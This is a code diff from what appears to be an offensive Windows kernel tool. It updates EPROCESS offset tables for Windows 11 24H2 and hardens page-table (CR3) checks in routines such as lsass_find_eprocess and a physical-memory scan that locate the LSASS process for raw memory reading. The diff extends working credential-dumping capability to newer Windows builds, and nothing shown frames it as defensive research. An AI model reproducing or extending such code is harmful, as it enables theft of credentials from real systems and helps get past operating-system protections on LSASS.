@@ -221,8 +221,12 @@ typedef struct {
 } EpLayout;
 
 static const EpLayout g_ep_layouts[] = {
-    /* Win10 1903 / 2004 / 20H2 / 21H1 / 21H2 / 22H2  +  Win11 all */
-    { 0x5A8, 0x440, 0x448, 0x4B8, 0x5C0, "Win10-1903+ / Win11" },
+    /* Win11 24H2 (build 26100+) — ImageFileName shifted to 0x5B8 */
+    { 0x5B8, 0x440, 0x448, 0x4B8, 0x5D0, "Win11-24H2 (build 26100+)" },
+    /* Win11 24H2 variant — 0x5B0 */
+    { 0x5B0, 0x440, 0x448, 0x4B8, 0x5C8, "Win11-24H2-variant (0x5B0)" },
+    /* Win10 1903 / 2004 / 20H2 / 21H1 / 21H2 / 22H2  +  Win11 21H2–23H2 */
+    { 0x5A8, 0x440, 0x448, 0x4B8, 0x5C0, "Win10-1903+ / Win11-23H2" },
     /* Win10 1709 / 1803 / 1809 */
     { 0x450, 0x2E8, 0x2F0, 0x358, 0x470, "Win10-1709/1803/1809" },
     /* Win10 1607 */
@@ -457,9 +461,9 @@ static uint64_t eproc_via_phys_scan(uint32_t pid, uint64_t *out_cr3)
                     if ((tok   & ~0xFULL) < 0xFFFF800000000000ULL) continue;
                     if (flink < 0xFFFF800000000000ULL) continue;
 
-                    /* DTB */
+                    /* DTB must be a physical address — reject kernel VAs (bit 40+) */
                     uint64_t dtb = *(uint64_t*)(ep_buf + EP_OFF_DTB);
-                    if (!dtb || (dtb & 0xFFF)) continue;
+                    if (!dtb || (dtb & 0xFFF) || (dtb >> 40)) continue;
 
                     char name[16]={0}; memcpy(name, ep_buf+L->off_name, 15);
                     printf("\n  [phys scan] PA=0x%016llX  PID=%u  Name=%s\n"
@@ -488,7 +492,7 @@ static uint64_t lsass_find_eprocess(uint32_t pid, uint64_t *out_cr3)
         if (epa) {
             uint64_t dtb = 0;
             phys_read(epa + EP_OFF_DTB, &dtb, 8);
-            if (dtb && !(dtb & 0xFFF)) {
+            if (dtb && !(dtb & 0xFFF) && !(dtb >> 40)) {
                 printf("  [Method A] PA=0x%016llX  CR3=0x%016llX\n",
                        (unsigned long long)epa, (unsigned long long)dtb);
                 *out_cr3 = dtb;
